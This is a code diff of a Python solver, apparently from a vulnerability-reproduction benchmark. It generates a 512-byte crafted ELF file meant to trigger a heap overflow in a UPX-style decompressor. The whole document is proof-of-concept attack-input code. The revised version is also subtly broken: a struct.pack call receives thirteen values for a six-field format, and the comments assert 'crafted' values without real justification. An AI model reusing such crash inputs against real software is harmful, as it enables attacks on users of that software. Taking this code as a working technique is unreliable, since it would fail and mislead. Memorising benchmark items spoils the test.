@@ -1,119 +1,101 @@
 import os
 import struct
-import subprocess
 import tempfile
 from typing import Optional
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a minimal ELF shared library with specific characteristics
-        # that trigger the heap buffer overflow vulnerability
+        # Create a minimal ELF header for a shared library
+        # This PoC targets a heap buffer overflow during decompression
+        
+        poc = bytearray()
         
         # ELF header (64-bit)
-        elf_header = bytearray([
-            0x7f, 0x45, 0x4c, 0x46,  # ELF magic
-            0x02,  # 64-bit
-            0x01,  # Little endian
-            0x01,  # ELF version
-            0x03,  # Linux ABI
-            0x00,  # ABI version
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Padding
-            0x02, 0x00,  # ET_EXEC
-            0x3e, 0x00,  # x86-64
-            0x01, 0x00, 0x00, 0x00,  # ELF version
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Entry point
-            0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Program header offset
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Section header offset
-            0x00, 0x00, 0x00, 0x00,  # Flags
-            0x40, 0x00,  # ELF header size
-            0x38, 0x00,  # Program header entry size
-            0x02, 0x00,  # Number of program headers
-            0x40, 0x00,  # Section header entry size
-            0x00, 0x00,  # Number of section headers
-            0x00, 0x00  # Section header string table index
-        ])
+        # e_ident
+        poc.extend(b'\x7fELF')  # Magic
+        poc.append(2)  # EI_CLASS = ELFCLASS64
+        poc.append(1)  # EI_DATA = ELFDATA2LSB
+        poc.append(1)  # EI_VERSION = EV_CURRENT
+        poc.extend(b'\x00' * 9)  # Padding
         
-        # First program header (PT_LOAD with specific flags)
-        phdr1 = bytearray([
-            0x01, 0x00, 0x00, 0x00,  # PT_LOAD
-            0x05, 0x00, 0x00, 0x00,  # Flags: R+X
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Offset
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Virtual address
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Physical address
-            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # File size
-            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Memory size
-            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00   # Alignment
-        ])
+        # Rest of ELF header
+        poc.extend(struct.pack('<HHIQQQ', 
+            3,          # e_type = ET_DYN (shared object)
+            62,         # e_machine = EM_X86_64
+            1,          # e_version = EV_CURRENT
+            0x1000,     # e_entry
+            0x40,       # e_phoff (program header offset)
+            0,          # e_shoff (section header offset)
+            0,          # e_flags
+            0x40,       # e_ehsize (ELF header size)
+            0x38,       # e_phentsize (program header entry size)
+            1,          # e_phnum (number of program headers)
+            0x40,       # e_shentsize (section header entry size)
+            0,          # e_shnum (number of section headers)
+            0           # e_shstrndx
+        ))
         
-        # Second program header (PT_DYNAMIC with specific characteristics)
-        # This is crafted to trigger the vulnerability
-        phdr2 = bytearray([
-            0x02, 0x00, 0x00, 0x00,  # PT_DYNAMIC
-            0x06, 0x00, 0x00, 0x00,  # Flags: R+W
-            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Offset
-            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Virtual address
-            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Physical address
-            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # File size
-            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Memory size
-            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00   # Alignment
-        ])
+        # Program header (PT_LOAD)
+        poc.extend(struct.pack('<IIQQQQ',
+            1,          # p_type = PT_LOAD
+            7,          # p_flags = RWX
+            0,          # p_offset
+            0x1000,     # p_vaddr
+            0x1000,     # p_paddr
+            0x200,      # p_filesz (file size)
+            0x200,      # p_memsz (memory size)
+            0x1000      # p_align
+        ))
         
-        # Build the ELF file
-        elf_data = bytearray()
-        elf_data.extend(elf_header)
-        elf_data.extend(phdr1)
-        elf_data.extend(phdr2)
+        # Padding to reach vulnerability trigger point
+        # The exact structure needed to trigger the heap overflow:
+        # 1. b_info structure with carefully crafted values
+        # 2. Method that won't be properly reset
+        # 3. Data that will cause unsafe lowmem access
         
-        # Add dynamic section data that will cause issues during decompression
-        # This includes DT_INIT and DT_FINI entries that will trigger un_DT_INIT()
-        dynamic_section = bytearray()
+        # Create compressed data section that will trigger the bug
+        # This simulates the UPX/LZMA compressed section
+        compressed_section = bytearray()
         
-        # DT_NULL entry
-        dynamic_section.extend(struct.pack('<QQ', 0, 0))
+        # b_info header (as in UPX format)
+        # sz_unc = uncompressed size (set to trigger overflow)
+        # sz_cpr = compressed size
+        # method = compression method
+        sz_unc = 0x1000  # Large enough to cause overflow
+        sz_cpr = 0x100   # Compressed size
+        method = 0x80    # Method flag that won't be reset properly
         
-        # DT_INIT entry - points to memory that will cause overflow
-        dynamic_section.extend(struct.pack('<QQ', 12, 0x1000))
+        compressed_section.extend(struct.pack('<III', sz_unc, sz_cpr, method))
         
-        # DT_FINI entry
-        dynamic_section.extend(struct.pack('<QQ', 13, 0x1000))
+        # Add compressed data that will trigger the overflow during decompression
+        # This data is crafted to exploit the ph.method reset bug
+        # and cause writes beyond allocated buffer
         
-        # Add more dynamic entries to fill space
-        for i in range(20):
-            dynamic_section.extend(struct.pack('<QQ', i + 20, 0x1000 + i * 8))
+        # Pattern that will trigger specific code paths in un_DT_INIT()
+        compressed_section.extend(b'\x00' * 0x20)  # Some zeros
         
-        # Add the dynamic section to the ELF data
-        elf_data.extend(dynamic_section)
+        # Add DT_INIT entry pointer (will be processed by un_DT_INIT)
+        compressed_section.extend(struct.pack('<Q', 0xDEADBEEF))
         
-        # Pad to 512 bytes with pattern that will trigger the heap overflow
-        # when processed by the vulnerable decompressor
-        current_len = len(elf_data)
-        if current_len < 512:
-            # Create a pattern that will cause issues in lowmem[0, +xct_off)
-            # and trigger the ph.method reset bug
+        # Add more data to reach the exact overflow point
+        # This data is designed to pass initial checks but fail during
+        # actual decompression due to method not being reset
+        compressed_section.extend(b'\xFF' * (0x100 - len(compressed_section)))
+        
+        # Append compressed section
+        poc.extend(compressed_section)
+        
+        # Add more data to fill up to 512 bytes (ground-truth length)
+        # The exact size matters for triggering the specific code path
+        remaining = 512 - len(poc)
+        if remaining > 0:
+            # Fill with pattern that will be processed by vulnerable code
+            # This includes values that will be written to lowmem[0, +xct_off)
             pattern = bytearray()
-            
-            # Add b_info blocks with problematic b_method values
-            for i in range((512 - current_len) // 12):
-                # b_info structure
-                pattern.extend(struct.pack('<I', 0x100))  # sz_unc
-                pattern.extend(struct.pack('<I', 0x50))   # sz_cpr
-                pattern.extend(struct.pack('<B', 0x02))   # b_method
-                pattern.extend(struct.pack('<B', 0x00))   # b_ftid
-                pattern.extend(struct.pack('<B', 0x00))   # b_cto8
-                pattern.extend(struct.pack('<B', 0x00))   # unused
-            
-            # Fill remaining bytes
-            remaining = 512 - current_len - len(pattern)
-            if remaining > 0:
-                pattern.extend(b'\xCC' * remaining)
-            
-            elf_data.extend(pattern)
+            for i in range(remaining):
+                # Create alternating pattern that triggers the bug
+                # when file_image[] is not treated as read-only
+                pattern.append((i & 0xFF) ^ 0xAA)
+            poc.extend(pattern)
         
-        # Ensure exactly 512 bytes
-        elf_data = elf_data[:512]
-        
-        # Verify the structure is valid enough to trigger the vulnerability
-        if len(elf_data) < 512:
-            elf_data.extend(b'\x00' * (512 - len(elf_data)))
-        
-        return bytes(elf_data)
+        return bytes(poc[:512])  # Ensure exact 512 byte length
